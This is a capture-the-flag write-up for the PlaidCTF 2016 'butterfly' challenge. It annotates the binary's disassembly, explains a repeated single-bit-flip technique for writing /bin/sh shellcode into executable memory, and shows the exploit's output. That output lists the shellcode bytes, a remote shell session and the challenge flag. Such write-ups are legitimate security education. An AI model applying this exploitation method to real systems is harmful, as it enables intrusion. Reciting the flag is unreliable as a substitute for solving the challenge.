
##  PlaidCTF 2016 - butterfly (Pwn 150)
##### 15/04 - 17/02/2016 (48hr)

___
### Description: 
Sometimes the universe smiles upon you. And sometimes, well, you just have to roll 
your sleeves up and do things yourself. Running at butterfly.pwning.xxx:9999

___
### Solution
Binary was fairly easy to reverse. There's only the main() function:

```assembly
.text:004007A9 E8 72 FE FF FF        call    _setbuf
.text:004007AE BF 14 09 40 00        mov     edi, offset s                   ; "THOU ART GOD, "...
.text:004007B3 E8 48 FE FF FF        call    _puts
.text:004007B8 48 8B 15 71 05 20+    mov     rdx, cs:stdin@@GLIBC_2_2_5      ; stream
.text:004007BF 48 8D 3C 24           lea     rdi, [rsp+68h+var_68]           ; s
.text:004007C3 BE 32 00 00 00        mov     esi, 32h                        ; n
.text:004007C8 E8 73 FE FF FF        call    _fgets
.text:004007CD 41 BE 01 00 00 00     mov     r14d, 1
.text:004007D3 48 85 C0              test    rax, rax
.text:004007D6 74 75                 jz      short CLEANUP_40084D
.text:004007D8 48 8D 3C 24           lea     rdi, [rsp+68h+var_68]           ; nptr
.text:004007DC 31 F6                 xor     esi, esi                        ; endptr
.text:004007DE 31 D2                 xor     edx, edx                        ; base
.text:004007E0 E8 6B FE FF FF        call    _strtol                         ; base is zero
.text:004007E5 48 89 C3              mov     rbx, rax
.text:004007E8 48 89 DD              mov     rbp, rbx
.text:004007EB 48 C1 FD 03           sar     rbp, 3                          ; magic >> 3 (sign extend)
.text:004007EF 49 89 EF              mov     r15, rbp
.text:004007F2 49 81 E7 00 F0 FF+    and     r15, 0FFFFFFFFFFFFF000h         ; make address multiple of a page (otherwise mprotect will fail)
.text:004007F9 BE 00 10 00 00        mov     esi, 1000h                      ; len
.text:004007FE BA 07 00 00 00        mov     edx, 7                          ; prot
.text:00400803 4C 89 FF              mov     rdi, r15                        ; addr
.text:00400806 E8 55 FE FF FF        call    _mprotect
.text:0040080B 85 C0                 test    eax, eax
.text:0040080D 75 5C                 jnz     short MPROTECT_1_FAIL_40086B
.text:0040080F 80 E3 07              and     bl, 7                           ; get 3 LSBits of magic
.text:00400812 41 BE 01 00 00 00     mov     r14d, 1
.text:00400818 B8 01 00 00 00        mov     eax, 1
.text:0040081D 88 D9                 mov     cl, bl
.text:0040081F D3 E0                 shl     eax, cl                         ; and use them as a mask
.text:00400821 0F B6 4D 00           movzx   ecx, byte ptr [rbp+0]
.text:00400825 31 C1                 xor     ecx, eax
.text:00400827 88 4D 00              mov     [rbp+0], cl                     ; *(magic >> 3) ^= (1 << (magic & 7)) (FLIP 1 BIT)
.text:0040082A BE 00 10 00 00        mov     esi, 1000h                      ; len
.text:0040082F BA 05 00 00 00        mov     edx, 5                          ; prot
.text:00400834 4C 89 FF              mov     rdi, r15                        ; addr
.text:00400837 E8 24 FE FF FF        call    _mprotect                       ; make it R+X again
.text:0040083C 85 C0                 test    eax, eax
.text:0040083E 75 37                 jnz     short MPROTECT_2_FAIL_400877
.text:00400840 BF 56 09 40 00        mov     edi, offset aWasItWorthIt??     ; "WAS IT WORTH IT???"
.text:00400845 E8 B6 FD FF FF        call    _puts
.text:0040084A 45 31 F6              xor     r14d, r14d
.text:0040084D
.text:0040084D                   CLEANUP_40084D:                             ; CODE XREF: main+4Ej
.text:0040084D                                                               ; main+EDj ...
.text:0040084D 64 48 8B 04 25 28+    mov     rax, fs:28h
.text:00400856 48 3B 44 24 40        cmp     rax, [rsp+68h+var_28]
.text:0040085B 75 26                 jnz     short CANARY_FAILED_400883
.text:0040085D 44 89 F0              mov     eax, r14d
.text:00400860 48 83 C4 48           add     rsp, 48h
.text:00400864 5B                    pop     rbx
.text:00400865 41 5E                 pop     r14
.text:00400867 41 5F                 pop     r15
.text:00400869 5D                    pop     rbp
.text:0040086A C3                    retn
```

Here, we can flip 1 bit from an arbitrary memory location. Obviously 1 bit is not enough, but
if we do this multiple times, we can write a shellcode (setbuf() allows us to use a /bin/sh 
shellcode).

The first important thing is here:
```assembly
	.text:004007C3 BE 32 00 00 00        mov     esi, 32h                        ; n
	.text:004007C8 E8 73 FE FF FF        call    _fgets
```

This means that we can write 50 bytes on the stack. atoi() will deal only with the first part and
will ingore the rest so we're ok. The second important part is this:
```assembly
	.text:0040085B 75 26                 jnz     short CANARY_FAILED_400883
	.text:0040085D 44 89 F0              mov     eax, r14d
	.text:00400860 48 83 C4 48           add     rsp, 48h
```
Here, after the canary is checked, we delete the stack frame. If we choose to flip 7th bit from
address 0x00400864, then the new address will be:
```
	.text:00400860 48 83 C4 08           add     rsp, 8
```	
The stack pointer won't be alinged anymore and it will point at a higher location, inside the 
gets() buffer. This means that we can control the return address. We choose to return at the
beginning of main() and repeat the same attack. However that instruction will still be 
(add rsp, 8), so we can flip another bit and return to the main() again.

The plan is to find a safe location (X bit enabled) and place our shellcode there. Then instead
of returning to main we'll return to our shellcode. Let's place the shellcode at __libc_csu_init.
We read the original contents of from this address and we XOR them with the desired shellcode.
Then when we'll flip the bits the original contents will be canceled (double XOR) and the shellcode
will left.

The source code is shown at butterfly_expl.py. The flag is: `PCTF{b1t_fl1ps_4r3_0P_r1t3}`.

```
root@nogirl:~/ctf/plaidctf# ./butterfly_expl.py 
	Writing Shellcode byte #1: 01110000 (31)
	Writing Shellcode byte #2: 10100001 (f6)
	Writing Shellcode byte #3: 00001001 (48)
	Writing Shellcode byte #4: 11101101 (bb)
	Writing Shellcode byte #5: 01101110 (2f)
	Writing Shellcode byte #6: 11101011 (62)
	Writing Shellcode byte #7: 10010110 (69)
	Writing Shellcode byte #8: 00101111 (6e)
	Writing Shellcode byte #9: 01111010 (2f)
	Writing Shellcode byte #10: 01101110 (2f)
	Writing Shellcode byte #11: 00100111 (73)
	Writing Shellcode byte #12: 00100100 (68)
	Writing Shellcode byte #13: 11011011 (56)
	Writing Shellcode byte #14: 01110110 (53)
	Writing Shellcode byte #15: 01000010 (54)
	Writing Shellcode byte #16: 01011101 (5f)
	Writing Shellcode byte #17: 01001010 (6a)
	Writing Shellcode byte #18: 00111011 (3b)
	Writing Shellcode byte #19: 00001101 (58)
	Writing Shellcode byte #20: 01111001 (31)
	Writing Shellcode byte #21: 01011111 (d2)
	Writing Shellcode byte #22: 00100010 (0f)
	Writing Shellcode byte #23: 00010011 (05)
	Returning to shellcode...
	*** Opening Shell ***
		id
			uid=1001(problem) gid=1001(problem) groups=1001(problem)
		ls -la
			total 28
			drwxr-x--- 2 root problem 4096 Apr 15 21:49 .
			drwxr-xr-x 4 root root    4096 Apr 15 17:50 ..
			-rwxr-xr-x 1 root root    8328 Apr 15 18:26 butterfly
			-r--r----- 1 root problem   28 Apr 15 18:28 flag
			-rwxr-xr-x 1 root root     219 Apr 15 21:49 wrapper
		cat flag
			PCTF{b1t_fl1ps_4r3_0P_r1t3}
		cat wrapper
			#!/bin/bash
			DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
			cd $DIR
			ulimit -S -c 0 -t 20 -f 1000000 -v 1000000
			ulimit -H -c 0 -t 20 -f 1000000 -v 1000000
			exec nice -n 15 timeout -s 9 300 /home/problem/butterfly
		exit
	*** Connection closed by remote host ***
```
___
